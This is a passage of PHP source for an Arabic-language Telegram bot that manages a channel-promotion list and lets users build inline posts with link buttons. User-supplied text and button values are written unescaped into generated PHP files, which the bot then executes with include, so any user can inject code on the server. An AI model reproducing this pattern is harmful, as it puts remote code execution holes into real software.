[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
if($text and !$data and $unll == "ASLST"){
file_put_contents("data/ASLST.txt", "$text");
file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم وضع كليشة اسفل الستة ✔️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
# EMLST
if($data == "EMLST"){
file_put_contents("unll.txt", "EMLST");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل يمن الستة الأن ⚠️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
if($text and !$data and $unll == "EMLST"){
file_put_contents("data/EMLST.txt", "$text");
file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم حفظ يمين الستة ✔️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
# ESLST
if($data == "ESLST"){
file_put_contents("unll.txt", "ESLST");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل يسار الستة الأن ⚠️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
if($text and !$data and $unll == "ESLST"){
file_put_contents("data/ESLST.txt", "$text");
file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم حفظ يسار الستة ✔️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
# FASLST
if($data == "FASLST"){
file_put_contents("unll.txt", "FASLST");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل فاصل الستة الأن ⚠️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
if($text and !$data and $unll == "FASLST"){
file_put_contents("data/FASLST.txt", "$text");
file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم حفظ فاصل الستة ✔️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
# DELZH
if($data == "DELZH"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري حذف الزخرفة الأن ⏱",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
file_put_contents("data/EMLST.txt", "");
file_put_contents("data/ESLST.txt", "");
file_put_contents("data/FASLST.txt", "");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>" تم حذف الزخرفة يمين لستة
ويسار لستة وفاصل لستة  ✔️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
# AHSLST
$get = file_get_contents('data/ban.txt');
$ex = explode("\n",$get);
$bamem = count($ex);
$get = file_get_contents('data/ids.txt');
$ex = explode("\n",$get);
$chmem = count($ex);

if($data == "AHSLST"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري عمل احصائيات ⏱",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt15"]],
]])
]);
bot('SendMessage',[
'chat_id'=>-1001367409347,    
 'text'=>"
[أحْصُائياُت](t.me/taattbot) الْقَنَوَاتَ ✔️

📊 { $chmem } عُدِّدَ الْقَنَوَاتُ [الْمُشَارِكَةُ](t.me/taa_ttbot).
❌ { $bamem } عُدِّدَ الْقَنَوَاتُ [الْمَحْظُورَةُ](t.me/taatt).
",
'disable_web_page_preview'=>'true',
'parse_mode'=>"MarkDown",
]);
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم ارسال احصائيات للقروب  ✔️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt15"]],
]])
]);
}
# resfull
if($data == "resfull"){
file_put_contents("data/banall.txt", "");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري حذف الملفات المؤقته انتضر قليلاً 🗑",
"message_id"=>$message_id,
]);
$files = scandir('code');
$file = scandir('start');
for($l=0;$l<count($file);$l++){
unlink("start/$file[$l]");
for($i=0;$i<count($files);$i++){
unlink("code/$files[$i]/tepe_code.txt");
unlink("code/$files[$i]/code.php");
unlink("code/$files[$i]/lista.php");
unlink("code/$files[$i]/file_id.txt");
unlink("code/$files[$i]/textlist.txt");
unlink("code/$files[$i]/text.txt");
unlink("code/$files[$i]/txt.txt");
Rmdir("code/$files[$i]");
unlink("mark/$files[$i]");
unlink("data/nolist.txt");
unlink("data/yeslist.txt");
unlink("data/banall.txt");
unlink("data/lista.php");
}
}
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"لقد حذف جميع ملفات الغير هامة ☑️",
"message_id"=>$message_id,
'reply_markup'=>$back
]);
}
# commands member
$ba = json_encode(['inline_keyboard'=>[[['text'=>"الصفحة الرئيسية",'callback_data'=>"ba"]],]]);
$start = file_get_contents("start/l$from_id.txt");
if($data == "ba"){
file_put_contents("start/l$from_id.txt", "");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>$getstart."\n\nصنع كود ماركداون - انلاين 🔖",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"صنع منشور",'callback_data'=>"start"]],
]])
]);
}

if($data== "addd"){
file_put_contents("start/l$from_id.txt", "addd");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري فتح الاستقبال 🗑",
"message_id"=>$message_id,
]);
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"لقد تم فتح الاستقبال بنجاح ☑️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt15"]],
]])
]);
}
 $txtrep=str_replace("\n"," ",$text);
     $txtrep=str_replace("  "," ",$txtrep);
  $texts = explode(" ",$txtrep);
for($h=0;$h<7; $h++){
if(preg_match('/^(.*)@|@(.*)|(.*)@(.*)|(.*)@(.*)|@(.*)|(.*)@/',$texts[$h])  )
{
$text=trim($texts[$h]);
}
}
if(preg_match('/^(.*)@|@(.*)|(.*)@(.*)|(.*)@(.*)|@(.*)|(.*)@/',$text)  )
{
$ok = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChatMemberscount?chat_id=$text"))->result;
$admins = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChatAdministrators?chat_id=$text"))->ok;
$ch_id = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$text"))->result->id;
#-
$get_asbahi = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$text"));
$name_chat=$get_asbahi->result->title;
$username_chat=$get_asbahi->result->username;
#-
if($text and !$data and $start == "addd" and $ok > $users[0] and $admins == 1 and !in_array($ch_id, $getids) and !in_array($ch_id, $getban)){
file_put_contents("data/ids.txt", "$ch_id\n", FILE_APPEND);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
[$name](tg://user?id=$from_id) 
تَمَّ اضافة الْقَنَاةَ بِنجَاحِ ✅
",
'reply_to_message_id'=>$message_id,
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);}

if($text and !$data and $start == "addd" and $ok > $users[0] and $admins != 1 and !in_array($ch_id, $getban)){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
[$name](tg://user?id=$from_id)
⚠️ قنَاتُكَ لَمـ تُضَافـ !
 أضِفـ البُوتـ ".$hadll." إدَارِي بِقنَاتُك ثُمَّ
 ↩️ أعِد إرسَال قَناتُك كَمَـا فِـي الرِسَالـة التَالِـيـ⬇️ـه .",
 'reply_to_message_id'=>$message_id,
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"$name_chat @$username_chat",
]);}

if($text and !$data and $start == "addd" and $ok > $users[0] and $admins == 1 and in_array($ch_id, $getids) and in_array($json, $getban)){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
[$name](tg://user?id=$from_id)
قنَاتُكَ مُضَافَةُ وَتَمُّ تَحْدِيثِهَا ☑️
- - -
$name_chat\n@$username_chat",
'reply_to_message_id'=>$message_id,
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);}

if($text and !$data and $start == "addd" and $ok < $users[0] and !in_array($ch_id, $getban) and !in_array($ch_id, $getids)){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
[$name](tg://user?id=$from_id)
⚠️ | المَعذِرة عَدد مُشتركي قناتك أقلّ من ".$hadlll,
'reply_to_message_id'=>$message_id,
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);}

if($text and !$data and $start == "addd" and $ok > $users[0] and in_array($ch_id, $getban)){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
[$name](tg://user?id=$from_id)
⚠️ | المَعذِرة قناتك قامَت بمُخالفة شُروط الِسـتـة وتـ⁉️ـم حَظرُها .
♻️ راسِـل مُدير الِسـتـة إِن كَانـ لَديكَ أي سُـؤال ".$hadl,
'reply_to_message_id'=>$message_id,
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);
if($data== "addt"){
file_put_contents("start/l$from_id.txt", "addt");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري قفل الاستقبال 🗑",
"message_id"=>$message_id,
]);
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"لقد تم قفل الاستقبال بنجاح ☑️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt15"]],
]])
]);
}
 $txtrep=str_replace("\n"," ",$text);
     $txtrep=str_replace("  "," ",$txtrep);
  $texts = explode(" ",$txtrep);
for($h=0;$h<7; $h++){
if(preg_match('/^(.*)@|@(.*)|(.*)@(.*)|(.*)@(.*)|@(.*)|(.*)@/',$texts[$h])  )
{
$text=trim($texts[$h]);
}
}
if(preg_match('/^(.*)@|@(.*)|(.*)@(.*)|(.*)@(.*)|@(.*)|(.*)@/',$text)  )

if($text and !$data and $start == "addt" and $ok > $users[0] and $admins == 1 and !in_array($ch_id, $getidss) and !in_array($ch_id, $getbann)){
file_put_contents("data/idss.txt", "$ch_id\n", FILE_APPEND);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
[$name](tg://user?id=$from_id) 
⚠️ عــذرآ الاســتـقـبـال مـغـلـق الان !
 يـرجـو الانـتـظـار حـتـا يـتـم فـتـح الاسـتـقـبـال.
",
'reply_to_message_id'=>$message_id,
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);}

if($text and !$data and $start == "addt" and $ok > $users[0] and $admins != 1 and !in_array($ch_id, $getbann)){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
[$name](tg://user?id=$from_id)
⚠️ عــذرآ الاســتـقـبـال مـغـلـق الان !
 يـرجـو الانـتـظـار حـتـا يـتـم فـتـح الاسـتـقـبـال.",
 'reply_to_message_id'=>$message_id,
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);}

if($text and !$data and $start == "addt" and $ok > $users[0] and $admins == 1 and in_array($ch_id, $getidss) and in_array($json, $getbann)){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
[$name](tg://user?id=$from_id)
⚠️ عــذرآ الاســتـقـبـال مـغـلـق الان !
 يـرجـو الانـتـظـار حـتـا يـتـم فـتـح الاسـتـقـبـال.",
'reply_to_message_id'=>$message_id,
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);}

if($text and !$data and $start == "addt" and $ok < $users[0] and !in_array($ch_id, $getbann) and !in_array($ch_id, $getidss)){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
[$name](tg://user?id=$from_id)
⚠️ عــذرآ الاســتـقـبـال مـغـلـق الان !
 يـرجـو الانـتـظـار حـتـا يـتـم فـتـح الاسـتـقـبـال. ",
'reply_to_message_id'=>$message_id,
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);}

if($text and !$data and $start == "addt" and $ok > $users[0] and in_array($ch_id, $getbann)){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
[$name](tg://user?id=$from_id)
⚠️ عــذرآ الاســتـقـبـال مـغـلـق الان !
 يـرجـو الانـتـظـار حـتـا يـتـم فـتـح الاسـتـقـبـال.",
'reply_to_message_id'=>$message_id,
'disable_web_page_preview'=>'true',
'parse_mode'=>"markdown",
]);
# start
if($data == "start"){
$countsend = file_get_contents("data/countsend.txt");
$countsend1=$countsend+1;
 file_put_contents("data/countsend.txt",$countsend1);
mkdir("code/$countsend1");
file_put_contents("start/l$from_id.txt", "code");
file_put_contents("code/$countsend1/lista.php", "");
file_put_contents("code/$countsend1/code.php", "");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"
لان يمكنك ارسال احد الميديا 🔢
💞- صوره ، فديو ، بصمه ، ملف ،
📩- صوره متحركه , mp3  
🔖- ويمكنك ارسال نص .
",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>$back
]);
}
$lllll = "الان ارسل دكم الكيبورد\n دكمة جوه دكمة كـ مثال\n\nHi = t.me/taattbot\nHello = t.me/taattbot\n\nدكمة بصف دكمة كـ مثال\n\nHi = t.me/taattbot + Hello = t.me/taattbot\n\n📮- CH - @taatt";
$countsend1 = file_get_contents("data/countsend.txt");
if($text and !$data and $start == "code"){
file_put_contents("code/$countsend1/tepe_code.txt","text");
file_put_contents("code/$countsend1/code.php", '<?php'."\n".'bot("answerInlineQuery",[ "inline_query_id"=>$update->inline_query->id, "results"=>json_encode([[ "type"=>"article", "id"=>base64_encode(rand(5,555)), "title"=>"ارسال الكليشة 💌", "input_message_content"=>[ "message_text"=>"'.$text.'"], "parse_mode"=>html, "disable_web_page_preview"=>true, "reply_markup"=>[
"inline_keyboard"=>['."\n");
file_put_contents("start/l$from_id.txt", "gooo");
file_put_contents("code/$countsend1/textlist.txt", $text);
bot('sendmessage',[
'chat_id'=>$chat_id, 
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
'text'=>$lllll
]);
}
if($update->message->photo and !$data and $start == "code"){
file_put_contents("code/$countsend1/tepe_code.txt","sendphoto");
$file_id = $update->message->photo[1]->file_id;
file_put_contents("code/$countsend1/code.php", '<?php'."\n".'bot("answerInlineQuery",[ "inline_query_id"=>$update->inline_query->id, "cache_time"=>"'.$message_id.'", "results"=>json_encode([[ "type"=>"photo", "id"=>base64_encode(rand(5,555)), "photo_url"=>"'.$file_id.'", "thumb_url"=>"'.$file_id.'", "caption"=>"'.$txt.'", "reply_markup"=>[ "inline_keyboard"=>['."\n");
file_put_contents("code/$countsend1/text.txt", $file_id);
file_put_contents("code/$countsend1/txt.txt", $txt);
file_put_contents("start/l$from_id.txt", "gooo");
bot('sendmessage',[
'chat_id'=>$chat_id, 
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
'text'=>$lllll
]);
}
if($update->message->document and !$data and $start == "code"){
file_put_contents("code/$countsend1/tepe_code.txt","senddocument");
$file_id = $update->message->document->file_id;
file_put_contents("code/$countsend1/code.php", '<?php'."\n".'bot("answerInlineQuery",[ "inline_query_id"=>$update->inline_query->id, "cache_time"=>"'.$message_id.'", "results"=>json_encode([[ "type"=>"gif", "id"=>base64_encode(rand(5,555)), "gif_url"=>"'.$file_id.'", "thumb_url"=>"'.$file_id.'", "caption"=>"'.$txt.'", "reply_markup"=>[ "inline_keyboard"=>['."\n");
file_put_contents("code/$countsend1/text.txt", $file_id);
file_put_contents("code/$countsend1/txt.txt", $txt);
file_put_contents("start/l$from_id.txt", "gooo");
bot('sendmessage',[
'chat_id'=>$chat_id, 
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
'text'=>$lllll
]);
}
if($update->message->sticker and !$data and $start == "code"){
file_put_contents("code/$countsend1/tepe_code.txt","sendsticker");
$file_id = $update->message->sticker->file_id;
file_put_contents("code/$countsend1/code.php", '<?php'."\n".'bot("answerInlineQuery",[ "inline_query_id"=>$update->inline_query->id, "cache_time"=>"'.$message_id.'", "results"=>json_encode([[ "type"=>"sticker", "id"=>base64_encode(rand(5,555)), "sticker_file_id"=>"'.$file_id.'", "thumb_url"=>"'.$file_id.'", "caption"=>"'.$txt.'", "reply_markup"=>[ "inline_keyboard"=>['."\n");
file_put_contents("code/$countsend1/text.txt", $file_id);
file_put_contents("code/$countsend1/txt.txt", $txt);
file_put_contents("start/l$from_id.txt", "gooo");
bot('sendmessage',[
'chat_id'=>$chat_id, 
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
'text'=>$lllll
]);
}
if($update->message->voice and !$data and $start == "code"){
file_put_contents("code/$countsend1/tepe_code.txt","sendvoice");
$file_id = $update->message->voice->file_id;
file_put_contents("code/$countsend1/code.php", '<?php'."\n".'bot("answerInlineQuery",[ "inline_query_id"=>$update->inline_query->id, "cache_time"=>"'.$message_id.'", "results"=>json_encode([[ "type"=>"voice", "id"=>base64_encode(rand(5,555)), "voice_file_id"=>"'.$file_id.'", "thumb_url"=>"'.$file_id.'", "caption"=>"'.$txt.'", "reply_markup"=>[ "inline_keyboard"=>['."\n");
file_put_contents("code/$countsend1/text.txt", $file_id);
file_put_contents("code/$countsend1/txt.txt", $txt);
file_put_contents("start/l$from_id.txt", "gooo");
bot('sendmessage',[
'chat_id'=>$chat_id, 
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
'text'=>$lllll
]);
}
if($update->message->audio and !$data and $start == "code"){
file_put_contents("code/$countsend1/tepe_code.txt","sendaudio");
$file_id = $update->message->audio->file_id;
file_put_contents("code/$countsend1/code.php", '<?php'."\n".'bot("answerInlineQuery",[ "inline_query_id"=>$update->inline_query->id, "cache_time"=>"'.$message_id.'", "results"=>json_encode([[ "type"=>"audio", "id"=>base64_encode(rand(5,555)), "audio_file_id"=>"'.$file_id.'", "thumb_url"=>"'.$file_id.'", "caption"=>"'.$txt.'", "reply_markup"=>[ "inline_keyboard"=>['."\n");
file_put_contents("code/$countsend1/text.txt", $file_id);
file_put_contents("code/$countsend1/txt.txt", $txt);
file_put_contents("start/l$from_id.txt", "gooo");
bot('sendmessage',[
'chat_id'=>$chat_id, 
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
'text'=>$lllll
]);
}
if($update->message->video and !$data and $start == "code"){
file_put_contents("code/$countsend1/tepe_code.txt","sendvideo");
$file_id = $update->message->video->file_id;
file_put_contents("code/$countsend1/code.php", '<?php'."\n".'bot("answerInlineQuery",[ "inline_query_id"=>$update->inline_query->id, "cache_time"=>"'.$message_id.'", "results"=>json_encode([[ "type"=>"video", "id"=>base64_encode(rand(5,555)), "video_file_id"=>"'.$file_id.'", "thumb_url"=>"'.$file_id.'", "caption"=>"'.$txt.'", "reply_markup"=>[ "inline_keyboard"=>['."\n");
file_put_contents("code/$countsend1/text.txt", $file_id);
file_put_contents("code/$countsend1/txt.txt", $txt);
file_put_contents("start/l$from_id.txt", "gooo");
bot('sendmessage',[
'chat_id'=>$chat_id, 
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
'text'=>$lllll
]);
}

if($text != "/start" and !$data and $start == "gooo"){
$ex = explode("\n", $text);
# code
$getfull = file_get_contents("code/$countsend1/txt.txt");
$gettxt = file_get_contents("code/$countsend1/textlist.txt");
$getfile_id = file_get_contents("code/$countsend1/text.txt");
file_put_contents("code/$countsend1/lista.php", '<?php'."\n".'$list = json_encode(['."\n".'"inline_keyboard"=>['."\n");

for($i=0;$i<count($ex);$i++){
$h = explode("\n", $text);
$ooo = str_replace("http://", "", $h[$i]);
$oo = str_replace("https://", "", $ooo);
$o = str_replace("+ ", "\n", $oo);
$u = explode("\n", $o);
$n = count($u);

if(preg_match("/^(.*) = (.*)/", $o, $ch) and $n == 1){
file_put_contents("code/$countsend1/lista.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"]],', FILE_APPEND);
file_put_contents("code/$countsend1/code.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"]],', FILE_APPEND);
}
if(preg_match("/^(.*) = (.*)\n(.*) = (.*)/", $o, $ch) and $n == 2){
file_put_contents("code/$countsend1/lista.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"]],', FILE_APPEND);
file_put_contents("code/$countsend1/code.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"]],', FILE_APPEND);
}
if(preg_match("/^(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)/", $o, $ch) and $n == 3){
file_put_contents("code/$countsend1/lista.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"]],', FILE_APPEND);
file_put_contents("code/$countsend1/code.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"]],', FILE_APPEND);
}
if(preg_match("/^(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)/", $o, $ch) and $n == 4){
file_put_contents("code/$countsend1/lista.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"],["text"=>"'.$ch[7].'", "url"=>"'.$ch[8].'"]],', FILE_APPEND);
file_put_contents("code/$countsend1/code.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"],["text"=>"'.$ch[7].'", "url"=>"'.$ch[8].'"]],', FILE_APPEND);
}
if(preg_match("/^(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)/", $o, $ch) and $n == 5){
file_put_contents("code/$countsend1/lista.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"],["text"=>"'.$ch[7].'", "url"=>"'.$ch[8].'"],["text"=>"'.$ch[9].'", "url"=>"'.$ch[10].'"]],', FILE_APPEND);
file_put_contents("code/$countsend1/code.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"],["text"=>"'.$ch[7].'", "url"=>"'.$ch[8].'"],["text"=>"'.$ch[9].'", "url"=>"'.$ch[10].'"]],', FILE_APPEND);
}
if(preg_match("/^(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)/", $o, $ch) and $n == 6){
file_put_contents("code/$countsend1/lista.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"],["text"=>"'.$ch[7].'", "url"=>"'.$ch[8].'"],["text"=>"'.$ch[9].'", "url"=>"'.$ch[10].'"],["text"=>"'.$ch[11].'", "url"=>"'.$ch[12].'"]],', FILE_APPEND);
file_put_contents("code/$countsend1/code.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"],["text"=>"'.$ch[7].'", "url"=>"'.$ch[8].'"],["text"=>"'.$ch[9].'", "url"=>"'.$ch[10].'"],["text"=>"'.$ch[11].'", "url"=>"'.$ch[12].'"]],', FILE_APPEND);
}
if(preg_match("/^(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)/", $o, $ch) and $n == 7){
file_put_contents("code/$countsend1/lista.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"],["text"=>"'.$ch[7].'", "url"=>"'.$ch[8].'"],["text"=>"'.$ch[9].'", "url"=>"'.$ch[10].'"],["text"=>"'.$ch[11].'", "url"=>"'.$ch[12].'"],["text"=>"'.$ch[13].'", "url"=>"'.$ch[14].'"]],', FILE_APPEND);
file_put_contents("code/$countsend1/code.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"],["text"=>"'.$ch[7].'", "url"=>"'.$ch[8].'"],["text"=>"'.$ch[9].'", "url"=>"'.$ch[10].'"],["text"=>"'.$ch[11].'", "url"=>"'.$ch[12].'"],["text"=>"'.$ch[13].'", "url"=>"'.$ch[14].'"]],', FILE_APPEND);
}
if(preg_match("/^(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)\n(.*) = (.*)/", $o, $ch) and $n == 8){
file_put_contents("code/$countsend1/lista.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"],["text"=>"'.$ch[7].'", "url"=>"'.$ch[8].'"],["text"=>"'.$ch[9].'", "url"=>"'.$ch[10].'"],["text"=>"'.$ch[11].'", "url"=>"'.$ch[12].'"],["text"=>"'.$ch[13].'", "url"=>"'.$ch[14].'"],["text"=>"'.$ch[15].'", "url"=>"'.$ch[16].'"]],', FILE_APPEND);
file_put_contents("code/$countsend1/code.php", "\n".'[["text"=>"'.$ch[1].'", "url"=>"'.$ch[2].'"],["text"=>"'.$ch[3].'", "url"=>"'.$ch[4].'"],["text"=>"'.$ch[5].'", "url"=>"'.$ch[6].'"],["text"=>"'.$ch[7].'", "url"=>"'.$ch[8].'"],["text"=>"'.$ch[9].'", "url"=>"'.$ch[10].'"],["text"=>"'.$ch[11].'", "url"=>"'.$ch[12].'"],["text"=>"'.$ch[13].'", "url"=>"'.$ch[14].'"],["text"=>"'.$ch[15].'", "url"=>"'.$ch[16].'"]],', FILE_APPEND);
}
}
file_put_contents("start/l$from_id.txt", "");
file_put_contents("code/$countsend1/lista.php", "\n".']]);', FILE_APPEND);
file_put_contents("code/$countsend1/code.php", "\n".']]]])]);', FILE_APPEND);

include "code/$countsend1/lista.php";
$sens=file_get_contents("code/$countsend1/tepe_code.txt");
$ss=str_replace("send","",$sens);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"$gettxt",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
"reply_markup"=>$list
]);
bot($sens,[
"chat_id"=>$chat_id,
"$ss"=>"$getfile_id",
'caption'=>"$getfull",
"reply_markup"=>$list
]);

bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"`@taatt $countsend1`",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"صنع منشور",'callback_data'=>"start"],['text'=>'شارك المنشور', 'switch_inline_query'=>"$from_id"]],
]])
]);	
}

if($text == '/start'){
bot('SendMessage',[
'chat_id'=>$from_id,
'reply_to_message_id'=>$message_id,
'text'=>"$START",
'parse_mode'=>'MARKDOWN',
'disable_web_page_preview'=>'true',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"♻️- المطور -♻️", 'url'=>"t.me/taatt"]
],
]
])
]);
}
# delete-Fwd
include "ID-MRDG.php";

function message($chat_id, $text, $message_id){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>$text,
'reply_to_message_id'=>$message_id,
]);
}

if($msg->forward_from_chat and in_array($from_id, $sudo)){
bot('deleteMessage',[
'chat_id'=>$msg->forward_from_chat->id,
'message_id'=>$msg->forward_from_message_id,
]);
message($chat_id, "تم مسح الرسالة من القناة ✅", $message_id);
}
# GP-SMS
$lista = -1001387644097; #IDBP
# SR
if($data == "adt"){
bot('sendmessage',[
'chat_id'=>$chat_id, 
